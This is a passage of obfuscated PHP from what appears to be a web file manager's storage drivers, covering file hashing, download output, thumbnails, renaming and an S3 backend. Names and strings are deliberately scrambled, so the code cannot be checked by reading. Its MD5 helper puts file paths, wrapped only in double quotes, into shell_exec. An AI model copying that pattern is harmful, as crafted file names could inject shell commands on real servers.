($bá†÷ğã¯ç = 0; $bá†÷ğã¯ç < $CÛ†–Âæà; $bá†÷ğã¯ç++) { $bÍ‹†Òñ¬Ê .= $this->fileSubstr($F¿º¹®Úá˜, $Cƒƒ‡†ñ * $bá†÷ğã¯ç, $c¦¢Å››ªï); } goto E»µ±ÄšÏå; CŠî ñÜ: } public static $md5Cache = array(); public function hashMd5($E¼¾ÍÛØçÜ) { $E¼¾ÍÛØçÜ = $this->iconvSystem($E¼¾ÍÛØçÜ); if (isset(self::$md5Cache[$E¼¾ÍÛØçÜ])) { return self::$md5Cache[$E¼¾ÍÛØçÜ]; } self::$md5Cache[$E¼¾ÍÛØçÜ] = $this->hashMd5Shell($E¼¾ÍÛØçÜ); if (!self::$md5Cache[$E¼¾ÍÛØçÜ]) { self::$md5Cache[$E¼¾ÍÛØçÜ] = @md5_file($E¼¾ÍÛØçÜ); } return self::$md5Cache[$E¼¾ÍÛØçÜ]; } private function hashMd5Shell($bíßä‚Íâ„) { goto DğìÍ§÷ÓÂ; DğìÍ§÷ÓÂ: $F’‡ïÕÓÌ° =& $_SERVER[‚Ğ°–—î]; if (!function_exists($F’‡ïÕÓÌ°[94])) { return !1; } $bÅ®•æ•‰— = array($F’‡ïÕÓÌ°[95], $F’‡ïÕÓÌ°[96]); goto dƒí İµìï; dƒí İµìï: $F“É¨ÀñÇã = Cache::get($F’‡ïÕÓÌ°[97]); if (!$F“É¨ÀñÇã) { $dõ‘¦Øî = BASIC_PATH . $F’‡ïÕÓÌ°[98]; $cË³®°‘² = md5_file($dõ‘¦Øî); $F“É¨ÀñÇã = $F’‡ïÕÓÌ°[99]; foreach ($bÅ®•æ•‰— as $F‘……£ö¼¢) { $c‹£œßàÄô = shell_exec($F‘……£ö¼¢ . "\x20\42{$dõ‘¦Øî}\42"); if ($c‹£œßàÄô && substr(trim($c‹£œßàÄô), 0, 32) == $cË³®°‘²) { $F“É¨ÀñÇã = $F‘……£ö¼¢; break; } } Cache::set($F’‡ïÕÓÌ°[97], $F“É¨ÀñÇã, 3600); } if ($F“É¨ÀñÇã == $F’‡ïÕÓÌ°[99]) { return !1; } goto D·ÇÛ‰” ê; D·ÇÛ‰” ê: $c‹£œßàÄô = shell_exec($F“É¨ÀñÇã . "\x20\x22{$bíßä‚Íâ„}\x22"); $c‹£œßàÄô = str_replace($F’‡ïÕÓÌ°[100], $F’‡ïÕÓÌ°[33], $c‹£œßàÄô); return substr($c‹£œßàÄô, 0, 32); goto D¹ùë–¬‡; D¹ùë–¬‡: } public function link($C½âŠ¸Ì) { return $C½âŠ¸Ì; } public function fileOut($cÚƒÛ‹Ÿ™£, $Cö¯ŸèñÀ¤ = false, $d®ƒÛ¼›¼ = false, $d¯½‘œ¸’º = '') { goto Aè§ó‹ºÅ‡; aÃ„™¢òÓ: $D„–ñÁ•ëÍ = $this->getType() == $CÇÌµ…¡»ã[102]; $E…ë“½ÂğÂ = $GLOBALS[$CÇÌµ…¡»ã[6]][$CÇÌµ…¡»ã[84]][$CÇÌµ…¡»ã[103]][$CÇÌµ…¡»ã[104]]; $AÃË™¢õõ = (double) $GLOBALS[$CÇÌµ…¡»ã[6]][$CÇÌµ…¡»ã[84]][$CÇÌµ…¡»ã[103]][$CÇÌµ…¡»ã[105]] * 1024 * 1024; goto dÁ¶­©½äŠ; aİ‡£±¼ö³: header($CÇÌµ…¡»ã[132] . $aŒÑ£Ğ¢‘ . $CÇÌµ…¡»ã[124]); header($CÇÌµ…¡»ã[133] . $CÑ”íÕÛšÚ); header($CÇÌµ…¡»ã[134]); goto fïŠêµè; d»Í±Şã†: if (in_array($FÜíÔãÑÄå, array($CÇÌµ…¡»ã[108], $CÇÌµ…¡»ã[109], $CÇÌµ…¡»ã[110], $CÇÌµ…¡»ã[111]))) { $FÜíÔãÑÄå = $CÇÌµ…¡»ã[112]; } if (!$d¯½‘œ¸’º) { $d¯½‘œ¸’º = md5($aŒÑ£Ğ¢‘ . $this->hashSimple($cÚƒÛ‹Ÿ™£)); } $d¯½‘œ¸’º = $CÇÌµ…¡»ã[113] . $d¯½‘œ¸’º . $CÇÌµ…¡»ã[113]; goto AÈ›äó£´; eî‘¶…²Ù: $B…Æ‡æ„Õ = 0; $DÓà‚”¨ = $F»Üí»ò‰  - 1; $FÜíÔãÑÄå = $this->ext($CÑ”íÕÛšÚ); goto d»Í±Şã†; AÈ›äó£´: $eç·‚››Ğ = get_file_mime($FÜíÔãÑÄå); if (strstr($eç·‚››Ğ, $CÇÌµ…¡»ã[114])) { $eç·‚››Ğ = $eç·‚››Ğ . $CÇÌµ…¡»ã[115]; } if ($Cö¯ŸèñÀ¤ === !1 && !mime_support($eç·‚››Ğ)) { $Cö¯ŸèñÀ¤ = !0; $eç·‚››Ğ = $CÇÌµ…¡»ã[116]; } goto bƒêÈù ô; AÕ×¹½§Ó: header($CÇÌµ…¡»ã[121]); header($CÇÌµ…¡»ã[122] . $eç·‚››Ğ); header($CÇÌµ…¡»ã[123] . gmdate($CÇÌµ…¡»ã[106], time() + 3600 * 24 * 30) . $CÇÌµ…¡»ã[124]); goto eäéŠâñ¼‚; a§ºÔ­Ä¼: $C®ç˜ÔµÎ³ = !0; if ($_SERVER[$CÇÌµ…¡»ã[151]] == $CÇÌµ…¡»ã[152] && $F»Üí»ò‰  > 1204 * 1024 * 1024 * 2) { $C®ç˜ÔµÎ³ = !1; } if ($C®ç˜ÔµÎ³) { header($CÇÌµ…¡»ã[153] . ($DÓà‚”¨ - $B…Æ‡æ„Õ + 1)); } goto d¥‰ÙÍØ; dÁ¶­©½äŠ: @ob_end_clean(); set_timeout(); $D¸ÜÚÏ¯Õ³ = $this->infoFull($cÚƒÛ‹Ÿ™£); goto A«³äø„¦; bƒêÈù ô: $E¢ïŒ¬÷æá = rawurlencode($CÑ”íÕÛšÚ); $E¢ïŒ¬÷æá = $CÇÌµ…¡»ã[113] . $E¢ïŒ¬÷æá . $CÇÌµ…¡»ã[117] . $E¢ïŒ¬÷æá; if ($Cö¯ŸèñÀ¤) { header($CÇÌµ…¡»ã[118]); header($CÇÌµ…¡»ã[119] . $E¢ïŒ¬÷æá); } else { header($CÇÌµ…¡»ã[120] . $E¢ïŒ¬÷æá); } goto AÕ×¹½§Ó; fïŠêµè: header($CÇÌµ…¡»ã[135] . $F»Üí»ò‰ ); header($CÇÌµ…¡»ã[136]); if (!$Cö¯ŸèñÀ¤ && $FÜíÔãÑÄå == $CÇÌµ…¡»ã[137]) { if ($F»Üí»ò‰  > 1024 * 1024 * 5) { die; } $Eè’Û”Ú‰‰ = $this->getContent($cÚƒÛ‹Ÿ™£); $Eè’Û”Ú‰‰ = Html::clearSVG($Eè’Û”Ú‰‰); header($CÇÌµ…¡»ã[138] . $F»Üí»ò‰ ); echo $Eè’Û”Ú‰‰; die; } goto E»³åÏÛˆ; d¥‰ÙÍØ: if ($_SERVER[$CÇÌµ…¡»ã[154]] == $CÇÌµ…¡»ã[155]) { return; } $cÜ®Œ®Œ¾ = 1024 * 100; $C¿–Ç‹«Ì = 0; goto Aº†Ûƒ¬ÊÍ; E»³åÏÛˆ: $dâÃä”Œßì = strtolower($_SERVER[$CÇÌµ…¡»ã[139]]); if ($D„–ñÁ•ëÍ && $dâÃä”Œßì && $E…ë“½ÂğÂ) { if (strstr($dâÃä”Œßì, $CÇÌµ…¡»ã[140])) { header($CÇÌµ…¡»ã[141] . $cÚƒÛ‹Ÿ™£); } else { if (strstr($dâÃä”Œßì, $CÇÌµ…¡»ã[142])) { header($CÇÌµ…¡»ã[143] . $cÚƒÛ‹Ÿ™£); } else { if (strstr($dâÃä”Œßì, $CÇÌµ…¡»ã[144])) { header($CÇÌµ…¡»ã[145] . $cÚƒÛ‹Ÿ™£); } } } if ($AÃË™¢õõ) { header($CÇÌµ…¡»ã[146] . $AÃË™¢õõ); } return; } if (isset($_SERVER[$CÇÌµ…¡»ã[147]])) { if (preg_match($CÇÌµ…¡»ã[148], $_SERVER[$CÇÌµ…¡»ã[147]], $DíÓÉÆï±)) { $B…Æ‡æ„Õ = intval($DíÓÉÆï±[1]); if (!empty($DíÓÉÆï±[2])) { $DÓà‚”¨ = intval($DíÓÉÆï±[2]); } } header($CÇÌµ…¡»ã[149]); header("\x43\x6f\x6e\164\145\156\164\55\122\x61\156\x67\145\x3a\40\142\x79\164\x65\163\x20{$B…Æ‡æ„Õ}\x2d{$DÓà‚”¨}\57" . $F»Üí»ò‰ ); } else { header($CÇÌµ…¡»ã[150]); } goto a§ºÔ­Ä¼; Aè§ó‹ºÅ‡: $CÇÌµ…¡»ã =& $_SERVER[‚Ğ°–—î]; $this->cacheMethod(null, null); if (!$cÚƒÛ‹Ÿ™£ || !$this->exist($cÚƒÛ‹Ÿ™£)) { show_json(LNG($CÇÌµ…¡»ã[101]), !1, $d®ƒÛ¼›¼); } goto aÃ„™¢òÓ; A«³äø„¦: $F»Üí»ò‰  = $D¸ÜÚÏ¯Õ³[$CÇÌµ…¡»ã[77]]; $aŒÑ£Ğ¢‘ = gmdate($CÇÌµ…¡»ã[106], $D¸ÜÚÏ¯Õ³[$CÇÌµ…¡»ã[107]]); $CÑ”íÕÛšÚ = $d®ƒÛ¼›¼ ? $d®ƒÛ¼›¼ : $this->iconvApp($D¸ÜÚÏ¯Õ³[$CÇÌµ…¡»ã[28]]); goto eî‘¶…²Ù; Aº†Ûƒ¬ÊÍ: if ($AÃË™¢õõ) { $C¿–Ç‹«Ì = intval(1000 * 1000 * ($cÜ®Œ®Œ¾ / $AÃË™¢õõ)); } while ($B…Æ‡æ„Õ <= $DÓà‚”¨) { $d¶ìÜïğÀ– = timeFloat(); check_abort(); $CŒªù›Æµ¥ = $DÓà‚”¨ - $B…Æ‡æ„Õ + 1; if ($CŒªù›Æµ¥ <= $cÜ®Œ®Œ¾) { $cÜ®Œ®Œ¾ = $CŒªù›Æµ¥; } echo $this->fileSubstr($cÚƒÛ‹Ÿ™£, $B…Æ‡æ„Õ, $cÜ®Œ®Œ¾); $B…Æ‡æ„Õ += $cÜ®Œ®Œ¾; if ($cÜ®Œ®Œ¾ == $CŒªù›Æµ¥) { $B…Æ‡æ„Õ = $DÓà‚”¨ + 1; } if ($C¿–Ç‹«Ì) { $c¿˜² ß™ = intval(1000 * 1000 * (timeFloat() - $d¶ìÜïğÀ–)); $dàŞà—²†Â = $C¿–Ç‹«Ì - $c¿˜² ß™; if ($dàŞà—²†Â > 5) { usleep($dàŞà—²†Â); } } } goto eÊóä‰Ê»; e„Ğ‹ …Ü–: if (isset($_SERVER[$CÇÌµ…¡»ã[128]]) && strtotime($_SERVER[$CÇÌµ…¡»ã[128]]) == $D¸ÜÚÏ¯Õ³[$CÇÌµ…¡»ã[107]]) { header($CÇÌµ…¡»ã[129], !0, 304); die; } if (isset($_SERVER[$CÇÌµ…¡»ã[130]]) && $_SERVER[$CÇÌµ…¡»ã[130]] == $d¯½‘œ¸’º) { header($CÇÌµ…¡»ã[131] . $d¯½‘œ¸’º, !0, 304); die; } header($CÇÌµ…¡»ã[131] . $d¯½‘œ¸’º); goto aİ‡£±¼ö³; eäéŠâñ¼‚: header($CÇÌµ…¡»ã[125]); header($CÇÌµ…¡»ã[126]); header($CÇÌµ…¡»ã[127]); goto e„Ğ‹ …Ü–; eÊóä‰Ê»: } public function fileOutServer($aÃ˜ôÅŸ¶Ü, $f÷‚¶ŒˆÙ = false, $fùçâ¸ìøÕ = false, $cùå¶–¼¾Ç = '') { $this->fileOut($aÃ˜ôÅŸ¶Ü, $f÷‚¶ŒˆÙ, $fùçâ¸ìøÕ, $cùå¶–¼¾Ç); } public function fileOutLink($Dõª›¼·­½) { header($_SERVER[‚Ğ°–—î][156] . $Dõª›¼·­½); die; } public function cacheMethod($d¯·£ŒÜ±°, $C¼À”òø‘±) { goto bË²Œ‰‚æ; EŞ Ú«ª½: $CÛÛƒª—ºÚ = $Cõ¶«’²Ó[157] . $d¯·£ŒÜ±° . $Cõ¶«’²Ó[158] . rtrim($C³ÕóŞí, $Cõ¶«’²Ó[8]); if (is_null($d¯·£ŒÜ±°)) { $eò¨½Û‡Ûë = array(); return; } if (is_null($C¼À”òø‘±)) { unset($eò¨½Û‡Ûë[$CÛÛƒª—ºÚ]); return; } goto F›İëÁù‹¹; F›İëÁù‹¹: $e°íË‹Š‹ = isset($eò¨½Û‡Ûë[$CÛÛƒª—ºÚ]) ? $eò¨½Û‡Ûë[$CÛÛƒª—ºÚ] : null; if (!is_null($e°íË‹Š‹)) { return $e°íË‹Š‹; } $e°íË‹Š‹ = $this->{$d¯·£ŒÜ±°}($C¼À”òø‘±); goto Cƒ…‰ºİô; bË²Œ‰‚æ: $Cõ¶«’²Ó =& $_SERVER[‚Ğ°–—î]; static $eò¨½Û‡Ûë = array(); $C³ÕóŞí = $C¼À”òø‘± ? ltrim($this->getPathOuter($C¼À”òø‘±), $Cõ¶«’²Ó[8]) : $C¼À”òø‘±; goto EŞ Ú«ª½; Cƒ…‰ºİô: $eò¨½Û‡Ûë[$CÛÛƒª—ºÚ] = $e°íË‹Š‹; return $e°íË‹Š‹; goto aâ¤œ’Ÿõª; aâ¤œ’Ÿõª: } public function fileOutImage($E°¸—é¡ÀÀ, $böÎšùòáó = 250) { goto A²‰¥ĞŠÏê; D¼±¦ñ¹²: if (!($CêÚàÆ…à¬ = IO::move($fğÇ†™ ó, $A–ÔÉ®¯Ğ¸))) { return IO::fileOut($fğÇ†™ ó); } del_file($fğÇ†™ ó); IO::fileOut($CêÚàÆ…à¬); goto BÇğ©ªù†½; A²‰¥ĞŠÏê: $c…àÈ‰“ğÄ =& $_SERVER[‚Ğ°–—î]; if (substr($E°¸—é¡ÀÀ, 0, 4) == $c…àÈ‰“ğÄ[144]) { $this->fileOutLink($E°¸—é¡ÀÀ); } $B®ÇêŠ¼ê = $this->info($E°¸—é¡ÀÀ); goto d²ßÑ¿Õò; DÅî¬¹¦è: if (!($B¼ˆÔ˜Šì = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $c…àÈ‰“ğÄ[165]))) { $A–ÔÉ®¯Ğ¸ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $c…àÈ‰“ğÄ[166]); } else { $A–ÔÉ®¯Ğ¸ = KodIO::make($B¼ˆÔ˜Šì); } if ($B¼ˆÔ˜Šì = IO::fileNameExist($A–ÔÉ®¯Ğ¸, $dÌªùº‹ò)) { $fğÇ†™ ó = KodIO::make($B¼ˆÔ˜Šì); return IO::fileOut($fğÇ†™ ó); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto fĞÆÑŞé§; d²ßÑ¿Õò: if ($B®ÇêŠ¼ê[$c…àÈ‰“ğÄ[77]] <= 1024 * 50 || !function_exists($c…àÈ‰“ğÄ[159]) || $B®ÇêŠ¼ê[$c…àÈ‰“ğÄ[160]] == $c…àÈ‰“ğÄ[161]) { return $this->fileOut($E°¸—é¡ÀÀ); } if (isset($B®ÇêŠ¼ê[$c…àÈ‰“ğÄ[162]][$c…àÈ‰“ğÄ[163]])) { $AŸØŒ÷ùÉ¦ = $B®ÇêŠ¼ê[$c…àÈ‰“ğÄ[162]][$c…àÈ‰“ğÄ[163]]; } else { if (isset($B®ÇêŠ¼ê[$c…àÈ‰“ğÄ[162]][$c…àÈ‰“ğÄ[164]])) { $AŸØŒ÷ùÉ¦ = $B®ÇêŠ¼ê[$c…àÈ‰“ğÄ[162]][$c…àÈ‰“ğÄ[164]]; } else { $AŸØŒ÷ùÉ¦ = md5("{$B®ÇêŠ¼ê[$c…àÈ‰“ğÄ[28]]}\137{$B®ÇêŠ¼ê[$c…àÈ‰“ğÄ[75]]}\137{$B®ÇêŠ¼ê[$c…àÈ‰“ğÄ[77]]}"); } } $dÌªùº‹ò = "{$AŸØŒ÷ùÉ¦}\137{$böÎšùòáó}\x2e\160\156\147"; goto DÅî¬¹¦è; fĞÆÑŞé§: $fğÇ†™ ó = DATA_THUMB . $dÌªùº‹ò; if (!@file_exists($fğÇ†™ ó)) { $bŠÅÜ¾ëÎÙ = TEMP_FILES; if (!is_dir($bŠÅÜ¾ëÎÙ)) { mk_dir($bŠÅÜ¾ëÎÙ); } $AÍ‚´àæ×› = $bŠÅÜ¾ëÎÙ . $AŸØŒ÷ùÉ¦ . $c…àÈ‰“ğÄ[91] . $B®ÇêŠ¼ê[$c…àÈ‰“ğÄ[160]]; if (!@file_exists($AÍ‚´àæ×›)) { $AÍ‚´àæ×› = $this->download($E°¸—é¡ÀÀ, $AÍ‚´àæ×›); } $a´¸«±”Ñ = new ImageThumb($AÍ‚´àæ×›, $c…àÈ‰“ğÄ[167]); $a´¸«±”Ñ->prorate($fğÇ†™ ó, $böÎšùòáó, $böÎšùòáó * 10); } if (!file_exists($fğÇ†™ ó) || filesize($fğÇ†™ ó) < 100) { return @file_exists($AÍ‚´àæ×›) ? IO::fileOut($AÍ‚´àæ×›) : $this->fileOut($E°¸—é¡ÀÀ); } goto D¼±¦ñ¹²; BÇğ©ªù†½: } public function fileOutImageServer($BÌ’Şï¦ø, $Bì°à¤ÑŠ = 250) { $this->fileOutImage($BÌ’Şï¦ø, $Bì°à¤ÑŠ); } public function fileNameAuto($CªÎÙ’œÔ†, $aˆ“¬à«²“, $fè±’Ş°Ö¢ = REPEAT_RENAME, $bØãšÏ·ß = false) { goto AÂ‰½ ğò; B’•…÷ã¨: while ($this->exist(rtrim($CªÎÙ’œÔ†, $fÁõËÇÈ¢ù[8]) . $fÁõËÇÈ¢ù[8] . $AŠ‰İë“ˆÊ)) { $AŠ‰İë“ˆÊ = $CÄ¿Ï¦ŒÁ— . "\x28{$B¨ŠŞ‹Î¹Ë}\51{$A†»‘òÑÅ¡}"; $B¨ŠŞ‹Î¹Ë++; } return $AŠ‰İë“ˆÊ; goto B¤ÀŸĞàíÄ; AÂ‰½ ğò: $fÁõËÇÈ¢ù =& $_SERVER[‚Ğ°–—î]; $e‰“Ú¼“¶ = $CªÎÙ’œÔ† === $fÁõËÇÈ¢ù[33] ? $aˆ“¬à«²“ : rtrim($CªÎÙ’œÔ†, $fÁõËÇÈ¢ù[8]) . $fÁõËÇÈ¢ù[8] . $aˆ“¬à«²“; if ($fè±’Ş°Ö¢ == REPEAT_REPLACE || !$this->exist($e‰“Ú¼“¶) || $bØãšÏ·ß && $fè±’Ş°Ö¢ != REPEAT_RENAME_FOLDER) { return $aˆ“¬à«²“; } goto bØ»ËˆÔ¾Ç; C‡é¼ˆƒÔ: $B¨ŠŞ‹Î¹Ë = 1; $CÄ¿Ï¦ŒÁ— = substr($aˆ“¬à«²“, 0, strlen($aˆ“¬à«²“) - strlen($A†»‘òÑÅ¡)); $AŠ‰İë“ˆÊ = $CÄ¿Ï¦ŒÁ— . "\x28{$B¨ŠŞ‹Î¹Ë}\51{$A†»‘òÑÅ¡}"; goto B’•…÷ã¨; bØ»ËˆÔ¾Ç: if ($fè±’Ş°Ö¢ == REPEAT_SKIP) { return !1; } $A†»‘òÑÅ¡ = $fÁõËÇÈ¢ù[91] . get_path_ext($aˆ“¬à«²“); $A†»‘òÑÅ¡ = $A†»‘òÑÅ¡ == $fÁõËÇÈ¢ù[91] || $bØãšÏ·ß ? $fÁõËÇÈ¢ù[33] : $A†»‘òÑÅ¡; goto C‡é¼ˆƒÔ; B¤ÀŸĞàíÄ: } public function listAllFiles($a–Ñ¦Æ„Ï, $bƒÓÁÏö†, $cŠòæ¨à‘œ = array()) { goto aîø¾ğëÂâ; EñÃù×¼Š: $a–Ñ¦Æ„Ï = trim($a–Ñ¦Æ„Ï, $E¸Ù’ä¨[8]); foreach ($bƒÓÁÏö† as $Eô©‘‡Û–É) { $f±êèóŠÍ¶ = ltrim(substr($Eô©‘‡Û–É, strlen($a–Ñ¦Æ„Ï)), $E¸Ù’ä¨[8]); $FèÜò¼ÁÍ = array_merge($FèÜò¼ÁÍ, $this->slicePath($f±êèóŠÍ¶)); } $a«’à‘ñàÄ = array(); goto aİÇÑ½ÕÍˆ; aîø¾ğëÂâ: $E¸Ù’ä¨ =& $_SERVER[‚Ğ°–—î]; if (empty($bƒÓÁÏö†)) { return array(); } $FèÜò¼ÁÍ = array(); goto EñÃù×¼Š; aİÇÑ½ÕÍˆ: foreach (array_unique($FèÜò¼ÁÍ) as $Eô©‘‡Û–É) { $EÕ¼ô±ç“‚ = array($E¸Ù’ä¨[75] => $this->getPathOuter($E¸Ù’ä¨[8] . $a–Ñ¦Æ„Ï . $E¸Ù’ä¨[8] . $Eô©‘‡Û–É), $E¸Ù’ä¨[76] => 1, $E¸Ù’ä¨[77] => 0); if (substr($Eô©‘‡Û–É, -1) != $E¸Ù’ä¨[8]) { $EÕ¼ô±ç“‚[$E¸Ù’ä¨[76]] = 0; $dæØŒ‘ = $this->getPath($a–Ñ¦Æ„Ï . $E¸Ù’ä¨[8] . $Eô©‘‡Û–É); $EÕ¼ô±ç“‚[$E¸Ù’ä¨[77]] = isset($cŠòæ¨à‘œ[$dæØŒ‘]) ? $cŠòæ¨à‘œ[$dæØŒ‘] : $this->size($dæØŒ‘); } $a«’à‘ñàÄ[] = $EÕ¼ô±ç“‚; } return $a«’à‘ñàÄ; goto a¾Ó”†‡©Š; a¾Ó”†‡©Š: } public function slicePath($eİ£µ«œ…) { $Bë¬§Ãßò» =& $_SERVER[‚Ğ°–—î]; $C¤×â†ØÁ« = explode($Bë¬§Ãßò»[8], trim($eİ£µ«œ…, $Bë¬§Ãßò»[8])); $e½İÆÂ¿„á = 0; do { ++$e½İÆÂ¿„á; $eÄ‰óèŒß[] = implode($Bë¬§Ãßò»[8], array_slice($C¤×â†ØÁ«, 0, $e½İÆÂ¿„á)) . $Bë¬§Ãßò»[8]; } while ($e½İÆÂ¿„á < count($C¤×â†ØÁ«)); $eÄ‰óèŒß[count($C¤×â†ØÁ«) - 1] = $eİ£µ«œ…; return $eÄ‰óèŒß; } public function getHost() { $fÙã›Õó·— =& $_SERVER[‚Ğ°–—î]; $C½¿ˆ«•± = parse_url(trim($this->domain, $fÙã›Õó·—[8])); $e½ÖŒµ·ˆ¬ = isset($C½¿ˆ«•±[$fÙã›Õó·—[168]]) ? $C½¿ˆ«•±[$fÙã›Õó·—[168]] : http_type(); $BÉÇ¯ÏÈ¸¢ = isset($C½¿ˆ«•±[$fÙã›Õó·—[169]]) ? $C½¿ˆ«•±[$fÙã›Õó·—[169]] : $C½¿ˆ«•±[$fÙã›Õó·—[75]]; if (isset($C½¿ˆ«•±[$fÙã›Õó·—[170]])) { $BÉÇ¯ÏÈ¸¢ .= $fÙã›Õó·—[4] . $C½¿ˆ«•±[$fÙã›Õó·—[170]]; } return $e½ÖŒµ·ˆ¬ . $fÙã›Õó·—[171] . $BÉÇ¯ÏÈ¸¢; } public function pathEncode($FØŞ´â¡à) { $Dåæå—¸´ò =& $_SERVER[‚Ğ°–—î]; return str_replace($Dåæå—¸´ò[172], $Dåæå—¸´ò[8], rawurlencode($FØŞ´â¡à)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($E²ÙˆÍÆ¸©) { set_timeout(); require_once SDK_DIR . $_SERVER[‚Ğ°–—î][173]; parent::__construct(); $this->_init($E²ÙˆÍÆ¸©); } public function _init($C”Äó¨¡·´) { foreach ($C”Äó¨¡·´ as $C‹ºñ´éá˜ => $fİ”Êà‰†í) { if (isset($this->{$C‹ºñ´éá˜})) { $this->{$C‹ºñ´éá˜} = $fİ”Êà‰†í; } } $this->endpoint = $C”Äó¨¡·´[$_SERVER[‚Ğ°–—î][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($e¨ÔÉÚ² = "\x76\x34") { $this->signVer = $e¨ÔÉÚ²; $this->client->setSignatureVersion($e¨ÔÉÚ²); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto eÑ‰äİ„‹³; Dİõ¾Â²Š—: if ($ağ¨ÌÔ÷‹Ó[$B¦‘›ğ’±ò[175]] != $B¦‘›ğ’±ò[176] || $ağ¨ÌÔ÷‹Ó[$B¦‘›ğ’±ò[177]] != $B¦‘›ğ’±ò[176]) { return !1; } $CĞÏÊ•á¹‘ = array_map($B¦‘›ğ’±ò[178], $ağ¨ÌÔ÷‹Ó[$B¦‘›ğ’±ò[179]]); if (!is_array($CĞÏÊ•á¹‘)) { $CĞÏÊ•á¹‘ = array(); } goto Eˆä‚–ŒÉë; Eˆä‚–ŒÉë: $B’‰¿ÉîÅ˜ = array($B¦‘›ğ’±ò[180], $B¦‘›ğ’±ò[181], $B¦‘›ğ’±ò[182], $B¦‘›ğ’±ò[183], $B¦‘›ğ’±ò[184]); $BÇ—¸‘ÔŠ = array_diff($B’‰¿ÉîÅ˜, $CĞÏÊ•á¹‘); return empty($BÇ—¸‘ÔŠ); goto có¹¯Õ‰äÙ; eÑ‰äİ„‹³: $B¦‘›ğ’±ò =& $_SERVER[‚Ğ°–—î]; $ağ¨ÌÔ÷‹Ó = $this->getBucketCors(); if (!$ağ¨ÌÔ÷‹Ó || !is_array($ağ¨ÌÔ÷‹Ó)) { return !1; } goto Dİõ¾Â²Š—; có¹¯Õ‰äÙ: } public function mkfile($d¯Œ¼ô¤ƒ, $dÒŒ˜Ò¬¬‹ = '', $Cˆ£äëùã´ = REPEAT_RENAME) { $F•ÂÖÅ‰¿× = $this->setContent($d¯Œ¼ô¤ƒ, $dÒŒ˜Ò¬¬‹); if ($F•ÂÖÅ‰¿× !== !1) { return $this->getPathOuter($d¯Œ¼ô¤ƒ); } return !1; } public function mkdir($f§ËÖ„Ì‰Ó, $B£»„åÅˆ¦ = REPEAT_SKIP) { if (empty($f§ËÖ„Ì‰Ó)) { return !1; } if ($this->_isFolder($f§ËÖ„Ì‰Ó)) { return $this->getPathOuter($f§ËÖ„Ì‰Ó); } $d¼×İ©Ì˜ö = $this->setContent($f§ËÖ„Ì‰Ó, $_SERVER[‚Ğ°–—î][33], !0); if ($d¼×İ©Ì˜ö !== !1) { return $this->getPathOuter($f§ËÖ„Ì‰Ó); } return !1; } public function copyFile($DË±¬¼ˆç, $Aö¾­ÒïÁˆ, $Bˆššï§ç— = array()) { $aÎŞœº•¥° =& $_SERVER[‚Ğ°–—î]; $C­¸á©ÈŒ‰ = $this->objectMeta($DË±¬¼ˆç); if (!$C­¸á©ÈŒ‰) { return !1; } if ($C­¸á©ÈŒ‰[$aÎŞœº•¥°[77]] <= 1024 * 1024 * 200) { $DïÑğÅ—¿ö = $this->client->copyObject($this->bucket, $DË±¬¼ˆç, $this->bucket, $Aö¾­ÒïÁˆ, $aÎŞœº•¥°[185], $Bˆššï§ç—); } else { $DïÑğÅ—¿ö = $this->client->multiCopyObject($this->bucket, $DË±¬¼ˆç, $this->bucket, $Aö¾­ÒïÁˆ, $Bˆššï§ç—); } $DïÑğÅ—¿ö = $DïÑğÅ—¿ö ? $this->getPathOuter($Aö¾­ÒïÁˆ) : !1; return $DïÑğÅ—¿ö; } public function moveFile($Fâ¼ˆªğ„, $dÇ»¯¬†Ö) { if ($this->copyFile($Fâ¼ˆªğ„, $dÇ»¯¬†Ö)) { $this->delFile($Fâ¼ˆªğ„); return $this->getPathOuter($dÇ»¯¬†Ö); } return !1; } public function delFile($F‡À‘««¢) { return $this->client->deleteObject($this->bucket, $F‡À‘««¢); } public function delFolder($CİÕâ«ª·Ğ) { goto ağÛªÊ±Î; E®¿ÖÅ‘§: return $d¤òÙ¹¥Ê³ === $e·øĞïÏË ? !0 : !1; goto AÙ£¯­Œ¾; föÓÕ÷£‰í: $d¤òÙ¹¥Ê³ = $e·øĞïÏË = 0; $D«£øâÎ‡ª = array_chunk(array_keys($d…Ñ±ŸÑØ®), 1000); foreach ($D«£øâÎ‡ª as $DÍ’¬İÊ) { $d¤òÙ¹¥Ê³++; $e·øĞïÏË += (int) $this->client->deleteObjects($this->bucket, $DÍ’¬İÊ); } goto E®¿ÖÅ‘§; ağÛªÊ±Î: $B–‹šË«¬ =& $_SERVER[‚Ğ°–—î]; $d…Ñ±ŸÑØ® = $this->listObjs($CİÕâ«ª·Ğ); if (!$d…Ñ±ŸÑØ®) { $CİÕâ«ª·Ğ = trim($CİÕâ«ª·Ğ, $B–‹šË«¬[8]); if (!empty($CİÕâ«ª·Ğ)) { $CİÕâ«ª·Ğ .= $B–‹šË«¬[8]; } return $this->delFile($CİÕâ«ª·Ğ); } goto föÓÕ÷£‰í; AÙ£¯­Œ¾: } public function rename($f‘æ¤ÔíÄ, $a„è†òğØ) { return $this->renameObject($f‘æ¤ÔíÄ, $a„è†òğØ); } public function listPath($f ’Ó÷³ï¶, $dñáßºö¬ = false) { $C­ŞÆœƒàé =& $_SERVER[‚Ğ°–—î]; $a—§ô¶ˆ§ = $this->listObjs($f ’Ó÷³ï¶, null, null, $C­ŞÆœƒàé[8]); $b¿ïçåÛ‹ = array($C­ŞÆœƒàé[74] => array(), $C­ŞÆœƒàé[73] => array()); foreach ($a—§ô¶ˆ§ as $dÎ•Ğ†´İ => $CÒ–ĞÌ¢³À) { if ($dÎ•Ğ†´İ == $C­ŞÆœƒàé[8]) { continue; } if (isset($CÒ–ĞÌ¢³À[$C­ŞÆœƒàé[186]])) { $b¿ïçåÛ‹[$C­ŞÆœƒàé[74]][] = $this->folderInfo($CÒ–ĞÌ¢³À[$C­ŞÆœƒàé[186]], $dñáßºö¬); } else { if 